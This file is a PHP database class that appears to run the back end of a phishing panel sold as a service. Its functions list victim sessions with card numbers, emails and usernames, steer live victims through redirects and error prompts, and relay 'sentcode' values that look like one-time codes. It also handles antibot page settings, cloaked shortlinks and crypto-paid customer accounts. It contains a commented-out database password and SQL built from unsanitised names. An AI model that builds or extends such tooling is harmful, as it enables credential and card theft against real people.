<?php
namespace Library;

class DB {
  const servername = "localhost";
//   const username = "vue";
//   const password = "TaxsSQL83819";
    const username = "root";
  const password = "";
  const dbname = "testbase";

    public static function connect() {
    // Create connection
    $conn = mysqli_connect(self::servername, self::username, self::password, self::dbname);

    // Check connection
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }
        return $conn;
    }

    public static function getUser($conn,$userId,$auth = false) {
        $query=null;
        if($auth){
            $query = $conn->prepare("SELECT username , password, userId, user_type, telegram, balance, webNotifs , lastUpdateBlockBTC, lastUpdateBlockETH, chatID,shortlinksPkg from users where userId=?");
        }
        else{
            $query = $conn->prepare("SELECT username , userId, user_type, telegram, balance, webNotifs , lastUpdateBlockBTC, lastUpdateBlockETH,chatID,shortlinksPkg from users where userId=?");
        }
        $query->bind_param('s', $userId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getUserId($conn,$username){
        $query = $conn->prepare("SELECT username , userId FROM users WHERE username=?");
        $query->bind_param("s",$username); 
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getUserAuth($conn,$username) {
        $query = $conn->prepare("SELECT username , userId, password from users where username=?");
        $query->bind_param('s', $username);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getUserBTCAddress($conn,$userId) {
        $query = $conn->prepare("SELECT * from btc_addresses where userId=?");
        $query->bind_param('i', $userId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            if(mysqli_num_rows($queryresult)==0){
                return "NO_ADDR";
            }
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function saveUserInfo($conn,$userId,$username,$password,$chatID){
        $query = $conn->prepare(
            "UPDATE users SET username=? , password=? , chatID=? WHERE userId=?"
        );
        $query->bind_param('sssi', $username,$password,$chatID,$userId);
        $status = $query->execute();
        return $status;
    }

    public static function getUserETHAddress($conn,$userId) {
        $query = $conn->prepare(
            "SELECT * from eth_addresses where userId=?");
        $query->bind_param('i', $userId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            if(mysqli_num_rows($queryresult)==0){
                return "NO_ADDR";
            }
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function saveBtcTransactions($conn, $user, $address,$txs){
        $conn->begin_transaction();
         $query = $conn->prepare(
            "INSERT INTO btc_transactions (hash,userId,address,valueBtc,confirmedAt)
            VALUES (?,?,?,?,?)");
        foreach ($txs as $tx){
            $confirmedAt=rtrim($tx['confirmed'],'Z');
            $query->bind_param('sisis',$tx['tx_hash'],$user['userId'],$address,$tx['value'],$confirmedAt);
            $execresult=$query->execute();
            if(!$execresult){
                error_log("error inserting btc txs for user". $user['userId']);
            }
        }
        try{
            $conn->commit();
        }
        catch(Exception $e){
            error_log($e);
            return false;
        }
        return true;
    }

    public static function createBTCAdresssForUser($conn, $userId) {
        $query = $conn->prepare(
            "INSERT INTO btc_addresses ".
            "SELECT ?, COALESCE(MAX(wallet_index)+1,?) FROM btc_addresses");
        $query->bind_param('ii', $userId,$userId);
        $status = $query->execute();
        return $status;
    }

    public static function createEthAdresssForUser($conn, $userId) {
        $query = $conn->prepare(
            "INSERT INTO eth_addresses ".
            "SELECT ?, COALESCE(MAX(eth_wallet_index)+1,?) FROM eth_addresses");
        $query->bind_param('ii', $userId,$userId);
        $status = $query->execute();
        return $status;
    }


    public static function saveEthTransactions($conn, $user, $address,$txs){
        $conn->begin_transaction();
         $query = $conn->prepare(
            "INSERT INTO eth_transactions (hash,userId,address,valueEth,valueUsd,rate)
            VALUES (?,?,?,?,?,?)");
        foreach ($txs as $tx){
            $res=$query->bind_param(
                'sisisi',
                $tx['hash'],
                $user['userId'],
                $address,
                $tx['value'],
                $tx['valueUsd'],
                $tx['rate']);
            if(!$res){
                error_log($conn->error);
                return false;
            }
            $res=$query->execute();;
            if(!$res){
                error_log($conn->error);
                return false;
            }
        }
        $commitResult=$conn->commit();
        if(!$commitResult){
            error_log($conn->error);
            return false;
        }
        return true;
    }

    public static function getBtcTransactions($conn,$user){
        $query = $conn->prepare("SELECT * from btc_transactions where userId=?");
        $query->bind_param('i',$user['userId']);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getEthTransactions($conn,$user){
        $query = $conn->prepare("SELECT * from eth_transactions where userId=?");
        $query->bind_param('s',$user['userId']);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }


    public static function updateBalanceEthBlock($conn, $user, $newBalance, $block) {
        $query = $conn->prepare("UPDATE users SET balance = balance + ?, lastUpdateBlockETH=? WHERE userId=?");
        $query->bind_param('iii', $newBalance, $block, $user["userId"]);
        $status = $query->execute();
        return $status;
    }

    public static function updateBalanceBTCBlock($conn, $user, $newBalance, $block) {
        $query = $conn->prepare("UPDATE users SET balance = balance + ?, lastUpdateBlockBTC=? WHERE userId=?");
        $query->bind_param('iii', $newBalance, $block, $user["userId"]);
        $status = $query->execute();
        return $status;
    }
 
    public static function getPanelList($conn,$user){
        $query = $conn->prepare("SELECT panels.panelId , nodes.nodeID, nodes.NodeName, expires FROM `panels` INNER JOIN `nodes` ON `panels`.`nodeID` = `nodes`.`nodeID` where userId=?");
        $query->bind_param('i',$user['userId']);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getPanelsAddedTo($conn,$user){
        $query = $conn->prepare(
            "SELECT panels.panelId , nodes.nodeID, nodes.NodeName, expires, access FROM panel_access ". 
            "INNER JOIN panels ON panels.panelId = panel_access.panelId  ".
            "INNER JOIN nodes ON nodes.nodeId = panels.nodeId ".
            "where panel_access.userId=?"
        );
        $query->bind_param('i',$user['userId']);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getPanelAddedToById($conn,$user,$panelId){
        $query = $conn->prepare(
            "SELECT panels.panelId , nodes.nodeID, nodes.NodeName, expires, access FROM panel_access ". 
            "INNER JOIN panels ON panels.panelId = panel_access.panelId  ".
            "INNER JOIN nodes ON nodes.nodeId = panels.nodeId ".
            "where panel_access.userId=? AND panel_access.panelId=?"
        );
        $query->bind_param('is',$user['userId'],$panelId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getPanel($conn,$user,$panelId){
        $query = $conn->prepare(
            "SELECT * FROM `panels` INNER JOIN `nodes` ON `panels`.`nodeID` = `nodes`.`nodeID`" 
            ." where userId=? AND panelId=?");
        $query->bind_param('is',$user['userId'],$panelId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getPanelUser($conn,$panelId){
        $query = $conn->prepare(
            "SELECT * FROM `panels` INNER JOIN `users` ON `panels`.`userId` = `users`.`userId`" 
            ." where panelId=?");
        $query->bind_param('s',$panelId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getPanelSettings($conn,$nodeName,$panelId){
        $query = $conn->prepare("SELECT * FROM $nodeName.pages where panelID=?");
        $query->bind_param('s',$panelId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function savePanelSettings($conn,$nodeName,$panelId,$antibot_active,$mobile_only){
        $query = $conn->prepare("UPDATE $nodeName.pages SET antibot_active = ?, mobile_only=? where panelID=?");
        $query->bind_param("sss",$antibot_active,$mobile_only,$panelId);
        $status = $query->execute();
        return $status;
        return false;
    }

    public static function getNode($conn,$nodeName){
        $query = $conn->prepare(
            "SELECT * FROM nodes where nodeName=?");
        $query->bind_param('s',$nodeName);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getNodeById($conn,$nodeId){
        $query = $conn->prepare(
            "SELECT * FROM nodes where nodeId=?");
        $query->bind_param('s',$nodeId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function addHost($conn,$panelId,$domain) {
        $query = $conn->prepare(
            "INSERT INTO hosts (panelId,domain,hostStatus) VALUES (?,?,'PENDING_CHECK')".
            "ON DUPLICATE KEY UPDATE panelId=? , hostStatus=\"PENDING_CHECK\""
        );
        $query->bind_param('sss', $panelId,$domain,$panelId);
        $status = $query->execute();
        return $status;
    }  
    
    public static function getSessions($conn,$time = NULL){
        if(!$time){
            $time = time();
            $time = 0;
        }
        $query = $conn->prepare(
            "SELECT * FROM logs WHERE (Last_Online > $time - 60 OR cardnumber IS NOT NULL ".
            "OR email_address IS NOT NULL OR username IS NOT NULL) ".
            "AND Last_Online > $time - 604800 ". 
            "ORDER BY date_visited DESC");
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function checkPageTableExists($conn,$nodeName){
        $query = $conn->prepare("SHOW TABLES FROM $nodeName LIKE 'pages'");
        $query->execute();
        $result=$query->get_result();
        if($result->num_rows>0){
            return true;
        }
        return false;
    }
    
    public static function getSession($conn,$nodeName,$sessionId,$getpages){
        $query = null;
        if($getpages){
            $query = $conn->prepare("select * from logs INNER JOIN $nodeName.pages ON pages.pageID = logs.pageID where SessionID=?");
        }
        else{
            $query = $conn->prepare("select * from logs where SessionID=?");
        } 
        
        $query->bind_param("s",$sessionId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            if(null!==$result && count($result)==0){
                $query2 = $conn->prepare("select * from logs where SessionID=?");
                $query2->bind_param("s",$sessionId);
                $query2->execute();
                $query2result=$query2->get_result();
                $result2=$query2result->fetch_all(MYSQLI_ASSOC);
                return $result2;
            }
            return $result;
        }
        return false;
    }

    public static function getResponses($conn,$sessionId){
        $query = $conn->prepare("select * from respons where SessionID=?");
        $query->bind_param("s",$sessionId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getOptions($conn,$nodeName,$pageId){
        $query = $conn->prepare("select tokenButtonName,tokenButtonType,tokenName,isMainRow,SendTokenWithError FROM $nodeName.tokensetup where pageID=? AND tokenButtonName IS NOT NULL");
        $query->bind_param("s",$pageId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function updateRedirect($conn,$sessionId,$newRedirect,$setError){
        $query = $conn->prepare("update logs SET Next_Redirect = ? , show_error=? where SessionID=?");
        $query->bind_param("sss",$newRedirect,$setError,$sessionId);
        $status = $query->execute();
        return $status;
    }

    public static function sendData($conn,$sessionId,$newRedirect,$sentcode1,$sentcode2,$sentcode3,$sentcode4,$sentcode5,$setError){
        $query = $conn->prepare("update logs SET Next_Redirect = ?, sentcode=? , sentcode2=? ,sentcode3=?, sentcode4=?, sentcode5=?, show_error=? where SessionID=?");
        $query->bind_param("ssssssss",$newRedirect,$sentcode1,$sentcode2,$sentcode3,$sentcode4,$sentcode5,$setError,$sessionId);
        $status = $query->execute();
        return $status;
    }

    public static function getNotifications($conn,$user,$limit){
        $query = $conn->prepare("select * from notifications ".
            "JOIN users on notifications.userId=users.userId ".
            "where users.userId=? AND notifications.time > users.lastReadNotifications ".
            "ORDER BY time DESC LIMIT ?");
            
        $query->bind_param("si",$user['userId'],$limit);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function markReadNotifications($conn,$user){
        $query = $conn->prepare("update users SET lastReadNotifications = CURRENT_TIME() where userId=?");
        $query->bind_param("s",$user['userId']);
        $status = $query->execute();
        return $status;
    }

    public static function addNotification($conn,$userID,$type,$icon,$content,$isAlerted){
        $query = $conn->prepare("INSERT into notifications VALUES(NULL,?,?,?,?,CURRENT_TIME(),?)");
        $query->bind_param("ssssi",$userID,$type,$icon,$content,$isAlerted);
        $status = $query->execute();
        return $status;
    }

    public static function getLocationStats($conn){
        $query = $conn->prepare("SELECT Country, City, COUNT(*) AS Count FROM logs GROUP BY Country,City ORDER BY COUNT(*) DESC");
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getOsStats($conn){
        $query = $conn->prepare("SELECT Count(*) AS Count,OS FROM logs GROUP BY OS ORDER BY COUNT(*) DESC");
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getCoords($conn){
        $query = $conn->prepare("SELECT lat,lon FROM logs where lat IS NOT NULL AND lon IS NOT NULL ORDER BY Last_Online DESC LIMIT 30");
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getActivity($conn){
        $query = $conn->prepare("SELECT * FROM notifications  WHERE time >= now() - INTERVAL 1 DAY ORDER BY time DESC");
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getSiteList($conn,$user){
        $query = $conn->prepare("SELECT * FROM hosts INNER JOIN panels ON hosts.panelID = panels.panelID where userId=?");
        $query->bind_param('i',$user['userId']);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getProducts($conn){
        $query = $conn->prepare("SELECT products.*, users.username as creatorName FROM products INNER JOIN users ON products.creator = users.userId");
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getProduct($conn,$productID){
        $query = $conn->prepare("SELECT * FROM products WHERE productID=?");
        $query->bind_param("s",$productID);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getPanelAccessList($conn,$panelId){
        $query = $conn->prepare(
            "SELECT panelId, users.userId, users.chatID ,users.username ,access ". 
            "FROM `panel_access` ".
            "INNER JOIN users ON panel_access.userId = users.userId ".
            "WHERE panelID=?");
        $query->bind_param('s',$panelId);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function addPanelUser($conn, $panelId,$userId, $access) {
        $query = $conn->prepare(
            "INSERT INTO panel_access ".
            "VALUES (?,?,?)");
        $query->bind_param('sis', $panelId,$userId,$access);
        $status = $query->execute();
        return $status;
    }

    public static function editPanelUser($conn, $panelId,$userId,$access) {
        $query = $conn->prepare(
            "UPDATE panel_access ".
            "SET access=? WHERE userId=? AND panelId=?");
        $query->bind_param('sis', $access,$userId,$panelId);
        $status = $query->execute();
        return $status;
    }

    public static function removePanelUser($conn, $panelId,$userId) {
        $query = $conn->prepare(
            "DELETE FROM panel_access ".
            "WHERE userId=? AND panelId=?");
        $query->bind_param('is',$userId,$panelId);
        $status = $query->execute();
        return $status;
    }

    public static function getShortlinkDomainList($conn,$user){
        $query = $conn->prepare("SELECT * FROM `shortlink_domains`");
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function getShortlinks($conn,$user){
        $query = $conn->prepare("SELECT * FROM shortlink where userId=?");
        $query->bind_param('i',$user["userId"]);
        $query->execute();
        $queryresult=$query->get_result();
        if($queryresult){
            $result=$queryresult->fetch_all(MYSQLI_ASSOC);
            return $result;
        }
        return false;
    }

    public static function addShortLink($conn, $user, $domain,$destination,$shortname,$blackTDS=0) {
        $query = $conn->prepare(
            "INSERT INTO shortlink ".
            "VALUES (?, ?, ?, ?, ?)");
        $query->bind_param('ssiss',$shortname,$domain,$user["userId"],$destination,$blackTDS);
        $status = $query->execute();
        return $status;
    }

    public static function deleteShortLink($conn, $user, $shortname) {
        $query = $conn->prepare(
            "DELETE FROM shortlink ".
            "WHERE userId=? AND link=?");
        $query->bind_param('is',$user["userId"],$shortname);
        $status = $query->execute();
        return $status;
    }

    public static function editShortLink($conn, $user, $shortname,$destination) {
        $query = $conn->prepare(
            "UPDATE shortlink ".
            "SET destinationUrl=? ".
            "WHERE userId=? AND link=?");
        $query->bind_param('sis',$destination,$user["userId"],$shortname);
        $status = $query->execute();
        return $status;
    }
}
?>